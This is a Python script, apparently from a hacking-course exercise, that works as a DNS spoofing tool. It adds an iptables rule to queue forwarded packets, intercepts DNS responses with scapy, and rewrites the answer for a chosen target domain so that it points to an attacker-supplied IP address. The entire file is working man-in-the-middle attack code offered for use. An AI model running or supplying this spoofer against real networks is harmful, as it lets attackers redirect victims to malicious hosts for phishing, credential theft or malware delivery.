#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess

target_domain=""
spoof_domain=""

def iptables_changer(chain):
    subprocess.call(["iptables","-I",chain,"-j","NFQUEUE","--queue-num","0"])

def iptables_flusher():
    subprocess.call(["iptables","--flush"])

def process_packet(packet):
    scapy_pack=scapy_packet_worker(packet)
    if scapy_pack:
        packet.set_payload(str(scapy_pack))
        print("[+]Spoofed to 10.0.2.5")
    packet.accept()

def scapy_packet_worker(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target_domain in qname:
            ans = scapy.DNSRR(rrname=qname, rdata=spoof_domain)
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            return scapy_packet

def get_arguments():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--target",dest="target_domain",help="Enter the target domain to be spoofed")
    parser.add_argument("-s","--spoofto",dest="spoof_domain",help="Enter the ip where the target domain will be spoofed to")
    arg=parser.parse_args()
    return arg.target_domain,arg.spoof_domain

try:
    target_domain,spoof_domain=get_arguments()
    if not target_domain:
        print("[-]Please specify the target domain.")
        exit()
    if not spoof_domain:
        print("[-]Please specify the spoof domain.")
        exit()
    print("[+]Started DNS Spoofer.")
    iptables_changer("FORWARD")
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-]Quitting...")
    iptables_flusher()